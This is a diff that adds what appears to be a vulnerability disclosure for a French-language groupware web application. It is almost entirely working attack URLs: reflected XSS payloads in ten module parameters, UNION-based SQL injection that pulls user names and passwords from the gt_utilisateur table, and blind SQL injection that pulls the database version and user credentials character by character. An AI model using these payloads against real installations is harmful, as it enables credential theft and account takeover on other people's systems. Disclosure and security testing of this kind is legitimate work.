@@ -1,0 +1,29 @@
+XSS
+    http://www.example.com/module_utilisateurs/utilisateur.php?id_utilisateur"><script>alert('xss')</script>
+    http://www.example.com/module_agenda/evenement.php?id_evenement="><script>alert('xss')</script>
+    http://www.example.com/module_contact/contact.php?id_contact="><script>alert('xss')</script>
+    http://www.example.com/module_contact/index.php?id_dossier="><script>alert('xss')</script>
+    http://www.example.com/module_tache/index.php?id_dossier="><script>alert('xss')</script>
+    http://www.example.com/module_agenda/index.php?printmode="><script>alert('xss')</script>
+    http://www.example.com/module_lien/index.php?id_dossier="><script>alert('xss')</script>
+    http://www.example.com/module_forum/index.php?theme="><script>alert('xss')</script>
+    http://www.example.com/module_fichier/index.php?id_dossier="><script>alert('xss')</script>
+    http://www.example.com/module_tableau_bord/index.php?tdb_periode="><script>alert('xss')</script>
+ 
+    SQLi
+    To exploit minimum visit to "public" space
+    http://www.example.com/module_forum/index.php?theme=1' and 1=2 union select nom FROM gt_utilisateur WHERE 1 AND '1'='1
+    http://www.example.com/module_forum/index.php?theme=1' and 1=2 union select pass FROM gt_utilisateur WHERE 1 AND '1'='1
+     
+    BSQLi
+    To exploit minimum visit to "public" space
+    http://www.example.com/module_tache/tache.php?id_tache=1'+and+substring(@@version,1,1)='5
+    http://www.example.com/module_tache/tache.php?id_tache=1'+and+(select+1+from+gt_utilisateur+limit+0,1)='1
+ 
+    http://www.example.com/module_tache/tache.php?id_tache=1'+and+(select+substring(concat(1,pass),1,1)+from+gt_utilisateur+limit+0,1)='1
+    http://www.example.com/module_tache/tache.php?id_tache=1'+and+(select+substring(concat(1,nom),1,1)+from+gt_utilisateur+limit+0,1)='1
+ 
+    http://www.example.com/module_tache/tache.php?id_tache=1'and ascii(substring((SELECT nom from gt_utilisateur limit 0,1),1,1))>'0'>'0
+    http://www.example.com/module_tache/tache.php?id_tache=1'+and ascii(substring((SELECT nom from gt_utilisateur limit 0,1),1,1))='110
+	
+	
